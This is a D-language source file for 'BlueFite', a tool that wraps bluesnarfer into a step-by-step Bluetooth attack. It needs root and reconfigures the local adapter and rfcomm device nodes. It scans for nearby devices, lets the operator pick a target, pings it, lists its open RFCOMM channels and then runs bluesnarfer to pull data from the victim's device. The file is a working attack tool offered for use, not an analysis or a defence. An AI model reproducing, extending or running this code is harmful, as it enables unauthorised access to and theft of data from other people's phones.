import std.stdio;
import std.string;
import std.conv;
import std.process;
import std.regex;
import core.thread;
import core.time;
import core.stdc.stdlib;

enum Stages {
	RFCOMM, TEST, SCAN, PING, DUMP, EXEC
}
int stage;
string TARGET_BT_MAC = "";
int TARGET_BT_CHAN = 0;

void main(string[] args){
	writeln("\033[1;7;36m :::BlueFite::: \n\033[1;27;36mBinary wrapper by Sonic, original script by Sid \"Pahakir228\" Jaresky\033[0m");

	writeln(":: running priviledge check...");
	string otp = executeShell("id -u").output.chop();
	if(otp != "0") {
		writeln(":: [\033[1;31mFAIL\033[0m] priviledge check");
		writeln("This program must be run with superuser priviledges!");
		exit (-1);

	}
	Thread.sleep(dur!"seconds"(1));
	writeln(":: [\033[1;32mOK\033[0m] priviledge check");
	Thread.sleep(dur!"seconds"(1));

	writeln(":: setting up rfcomm (prep stage 0)...");
	stage = Stages.RFCOMM;
	bool ret = setup(Stages.RFCOMM);
	if(!ret) emext();
	Thread.sleep(dur!"seconds"(1));
	writeln(":: [\033[1;32mOK\033[0m] stage 0");

	writeln(":: running test (prep stage 1)...");
	stage = Stages.TEST;
	ret = setup(Stages.TEST);
	if(!ret) emext();
	writeln(":: [\033[1;32mOK\033[0m] stage 1");

	writeln(":: running scan (work stage 2)...");
	stage = Stages.SCAN;
	ret = setup(Stages.SCAN);
	if(!ret) emext();
	writeln(":: [\033[1;32mOK\033[0m] stage 2");

	writeln(":: pinging target (work stage 3)...");
	stage = Stages.PING;
	ret = setup(Stages.PING);
	if(!ret) emext();
	writeln(":: [\033[1;32mOK\033[0m] stage 3");

	writeln(":: dumping channels (work stage 4)...");
	stage = Stages.DUMP;
	ret = setup(Stages.DUMP);
	if(!ret) emext();
	writeln(":: [\033[1;32mOK\033[0m] stage 4");

	writeln(":: executing...");
	stage = Stages.EXEC;
	ret = setup(Stages.EXEC);
	if(ret)
		writeln("\033[1;32mFIN\033[0m");
	else
		writeln("\033[1;31mFIN\033[0m");
	rext();
}

void emext(){
	writeln(":: [\033[1;31mFAIL\033[0m] stage " ~ to!string(stage));
	writeln("Error occured while running stage!");
	exit(stage);
}

void rext(){
	writeln(":: exit...");
	exit(0);
}

bool setup(int stage){
	switch(stage) {
		case Stages.RFCOMM:
			int stat = 0;
			stat += executeShell("hciconfig -a hci0 down").status;
			stat += executeShell("rm -rf /dev/bluetooth/rfcomm").status;
			stat += executeShell("rm -rf /dev/rfcomm0").status;
			stat += executeShell("mkdir -p /dev/bluetooth/rfcomm").status;
			stat += executeShell("mknod -m 666 /dev/bluetooth/rfcomm/0 c 216 0").status;
			stat += executeShell("mknod --mode=666 /dev/rfcomm0 c 216 0").status;
			stat += executeShell("hciconfig -a hci0 up").status;
			return stat == 0;
		case Stages.TEST:
			auto p = executeShell("hciconfig hci0");
			if(p.status != 0) return false;
			writeln(p.output);
			return true;
		case Stages.SCAN:
			auto p = executeShell("hcitool scan");
			string output = p.output;
			string[] targets;

			if(output.length < 18){
				writeln("Couldn't find any targets :(");
				rext();
			}
			if(output.indexOf("\n") == -1)
				targets = [output];
			else targets = output.split("\n");
			auto targ_list = new string[1];
			int i = 0;
			writeln(":: targets found:");
			foreach(string s; targets) {
				if(matchFirst(s, "([\\dA-F]{2}\\:){5}[\\dA-F]"))
					writeln("\033[1;27;36m" ~ to!string(i) ~ "\033[0m - " ~ s);
					targ_list.length = ++i;
					targ_list[i-1] = s;
			}
			write(":: choose one of them: ");
			string inp = readln().chop();
			int num;
			try {
				num = to!int(inp);
			} catch (std.conv.ConvException ex) {
				writeln(":: Not a positive integer: " ~ inp ~ "!");
				emext();
			}
			if(num >= i || num < 0) {
				writeln(":: [\033[1;31mX\033[0m] No target with such number!");
				return false;
			}
			TARGET_BT_MAC = targ_list[num][1..18];
			writeln(":: proceeding for mac '" ~ TARGET_BT_MAC ~ "'");
			return true;
		case Stages.PING:
			auto p = executeShell("l2ping -c 2 " ~ TARGET_BT_MAC);
			int result = p.status;

			foreach(string s; p.output.chop().split("\n")){
				if(s == "Can't connect: Host is down"){
					writeln(":: can't connect: host is down");
					emext();
				}
			}

			if(result != 0) return false;
			return true;
		case Stages.DUMP:
			auto p = executeShell("sdptool browse " ~ TARGET_BT_MAC);
			string output = p.output;
			string lines_construct = ":: select channel:\n";
			string[] out_blocks = output.chop().split("\n\n");
			foreach(string block; out_blocks){
				if(block.indexOf("Channel:") != -1){
					foreach(string line; block.split("\n")){
						if(line.indexOf("Service Name") != -1 || line.indexOf("Channel") != -1){
							lines_construct ~= line;
							lines_construct ~= "\n";
						}
					}
				}
			}
			if(lines_construct.length < 20) {
				writeln(":: target does not seem to have open channels");
				emext();
			}
			else {
				write(lines_construct ~ ":: ");
				string channel = readln().chop();
				if(to!int(channel) > 0) {
					TARGET_BT_CHAN = to!int(channel);
					writeln(":: proceeding for channel " ~ channel);
				} else {
					writeln(":: invalid channel");
					emext();
				}
			}
			return true;
		case Stages.EXEC:
			auto p = executeShell("bluesnarfer -b -C " ~ to!string(TARGET_BT_CHAN) ~ " " ~ TARGET_BT_MAC ~ " -i");
			writeln("\n:: bluesnarfer says:\n" ~ p.output);
			return p.status == 0;
		default: assert(0);
	}
}
